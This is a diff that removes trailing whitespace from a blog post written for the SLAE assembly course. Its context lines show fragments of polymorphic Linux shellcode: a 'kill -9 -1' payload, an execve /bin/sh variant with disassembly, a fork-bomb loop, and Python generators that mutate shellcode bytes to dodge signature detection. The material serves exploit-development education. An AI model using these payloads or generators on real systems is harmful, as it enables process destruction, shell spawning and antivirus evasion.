@@ -29,7 +29,7 @@ As example, this piece of code
 mov al, 0x11
 {%endhighlight%}
 
-can be rewritten as 
+can be rewritten as
 
 {%highlight asm%}
 mov bl, 0x12
@@ -123,14 +123,14 @@ direct load, instead:
 
 {%highlight asm%}
 ; Filename: 	kill_second_variant.nasm
-; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
+; Author:	Paolo Perego <paolo@codiceinsicuro.it>
 ; Website:  	https://codiceinsicuro.it
 ; Blog post:  	https://codiceinsicuro.it/slae/
 ; Twitter:   	@thesp0nge
 ; SLAE-ID:    	1217
 ; Purpose:	This is my second variant for kill -9 -1 shellcode. This
 ;		shellcode is 13 byte long and I will use it as a skeleton for
-;		polymorphic generator. 
+;		polymorphic generator.
 
 section .text
 
@@ -330,8 +330,8 @@ def kill_div_for_mov(n, mov_to_cl=False):
     #   Our code here will calculate an initializer number for EAX this way:
     #       DL = random number between 1..FF
     #       EAX = 37 * DL
-    # 
-    # After the last div, n will be stored in AL and AH will be 0. 
+    #
+    # After the last div, n will be stored in AL and AH will be 0.
     #
     # The impact in terms of byte is +4 bytes every MOV substituted with the
     # DIV. The impact is +6 when the value must be in another register but EAX.
@@ -345,11 +345,11 @@ def kill_div_for_mov(n, mov_to_cl=False):
     val = socket.htons(ax_value);   # now the value is in network byte order
                                     # like the way it would be stored into
                                     # the stack
- 
-    hex_val = format(val, 'x');     
+
+    hex_val = format(val, 'x');
     mov_ax = "\\x66\\xb8\\x"+hex_val[0:2]+"\\x"+hex_val[2:4];
     mov_dl = "\\xb2\\x"+format(dl_value, 'x');
-    div_dl = "\\xf6\\xf2";          
+    div_dl = "\\xf6\\xf2";
 
     code = mov_ax+mov_dl+div_dl;
 
@@ -440,8 +440,8 @@ def kill_div_for_mov(n, mov_to_cl):
     #   Our code here will calculate an initializer number for EAX this way:
     #       DL = random number between 1..FF
     #       EAX = 37 * DL
-    # 
-    # After the last div, n will be stored in AL and AH will be 0. 
+    #
+    # After the last div, n will be stored in AL and AH will be 0.
     # The impact in terms of byte is +4 bytes every MOV substituted with the
     # DIV. The impact is +6 when the value must be in another register but EAX.
     #
@@ -454,11 +454,11 @@ def kill_div_for_mov(n, mov_to_cl):
     val = socket.htons(ax_value);   # now the value is in network byte order
                                     # like the way it would be stored into
                                     # the stack
- 
-    hex_val = format(val, 'x');     
+
+    hex_val = format(val, 'x');
     mov_ax = "\\x66\\xb8\\x"+hex_val[0:2]+"\\x"+hex_val[2:4];
     mov_dl = "\\xb2\\x"+format(dl_value, 'x');
-    div_dl = "\\xf6\\xf2";          
+    div_dl = "\\xf6\\xf2";
 
     code = mov_ax+mov_dl+div_dl;
 
@@ -483,7 +483,7 @@ def main(argv):
     except getopt.GetoptError:
         help()
         sys.exit(1)
-    
+
     for opt, arg in opts:
         if opt in ('-h', '--help'):
             help()
@@ -603,11 +603,11 @@ After this, there is the "call" trick:
 
 	jmp short shell
 
-flow:	
+flow:
 	pop ebx
 	int 0x80
 
-shell: 	
+shell:
 	call dword flow
 ...
 {%endhighlight%}
@@ -629,14 +629,14 @@ The execve() shellcode variant is 25 byte long, instead of 30 bytes of the
 original shellcode taken from the website.
 
 {%highlight asm%}
-; Filename: 	
-; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
+; Filename:
+; Author:	Paolo Perego <paolo@codiceinsicuro.it>
 ; Website:  	https://codiceinsicuro.it
 ; Twitter:   	@thesp0nge
 ; SLAE-ID:    	1217
 ; Purpose:	Polymorphic variation for an obfuscated shellcode
 
-global _start			
+global _start
 
 section .text
 
@@ -650,11 +650,11 @@ _start:
 
 	jmp short shell
 
-flow:	
+flow:
 	pop ebx
 	int 0x80
 
-shell: 	
+shell:
 	call dword flow
 	das
 	bound ebp,[ecx+0x6e]
@@ -688,10 +688,10 @@ Disassembly of section .text:
 
 0804808c <shell>:
  804808c:	e8 f8 ff ff ff       	call   8048089 <flow>
- 8048091:	2f                   	das    
+ 8048091:	2f                   	das
  8048092:	62 69 6e             	bound  %ebp,0x6e(%ecx)
- 8048095:	2f                   	das    
- 8048096:	2f                   	das    
+ 8048095:	2f                   	das
+ 8048096:	2f                   	das
  8048097:	73 68                	jae    8048101 <_end+0x65>
 
 {%endhighlight%}
@@ -762,7 +762,7 @@ def exec_nop_dope():
     init_blk =["\\x6a\\x0b\\x58", "\\x31\\xc9", "\\x31\\xd2"];
     setup_blk=["\\x5b", "\\xcd\\x80", "\\xe8\\xf8\\xff\\xff\\xff"];
 
-    n = randint(0, 10); 
+    n = randint(0, 10);
     init_nop_blk = ["\\x90"]*(n/3)
     setup_nop_blk = ["\\x90"]*(n*2/3)
 
@@ -811,7 +811,7 @@ In our original shellcode we've got:
 
 0804808c <shell>:
  804808c:	e8 f8 ff ff ff       	call   8048089 <flow>
- 8048091:	2f                   	das    
+ 8048091:	2f                   	das
 
 {%endhighlight%}
 
@@ -831,7 +831,7 @@ def exec_nop_dope():
     init_blk =["\\x6a\\x0b\\x58", "\\x31\\xc9", "\\x31\\xd2"];
     setup_blk=["\\x5b" ];
 
-    n = randint(0, 10); 
+    n = randint(0, 10);
     init_nop_blk = ["\\x90"]*(n/3)
     setup_nop_blk = ["\\x90"]*(n*2/3)
 
@@ -915,7 +915,7 @@ def kill_nop_super_dope():
     nop_blk=["\\x90", "\\x83\\xf8\\x$$", "\\x83\\xfb\\x??", "\\x83\\xf9\\x%%", "\\x87\\xdb", "\\x87\\xc9"]
 
     shuffle(nop_blk)
-    n = randint(0, 10); 
+    n = randint(0, 10);
     init_nop_blk = nop_blk[0:(n/3)]
     shuffle(nop_blk)
     setup_nop_blk = nop_blk[0:(n*2/3)]
@@ -1063,7 +1063,7 @@ global _start
 _start:
 	xor eax, eax
 	mov al, 0x2
-    
+
 	int 0x80
 	jmp short _start
 {%endhighlight%}
@@ -1112,7 +1112,7 @@ def fork_nop_dope():
     init_blk =["\\x31\\xc0"];
     setup_blk=["\\xb0\\x02" ];
 
-    n = randint(0, 3); 
+    n = randint(0, 3);
     init_nop_blk = ["\\x90"]*(n/3)
     setup_nop_blk = ["\\x90"]*(n*2/3)
 
@@ -1148,7 +1148,7 @@ def kill_nop_super_dope():
     nop_blk=["\\x90", "\\x83\\xf8\\x$$", "\\x83\\xfb\\x??", "\\x83\\xf9\\x%%", "\\x87\\xdb", "\\x87\\xc9"]
 
     shuffle(nop_blk)
-    n = randint(0, 10); 
+    n = randint(0, 10);
     init_nop_blk = nop_blk[0:(n/3)]
     shuffle(nop_blk)
     setup_nop_blk = nop_blk[0:(n*2/3)]
@@ -1286,4 +1286,3 @@ This blog post has been created for completing the requirements of the SecurityT
 [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
 
 Student ID: SLAE-1217
-
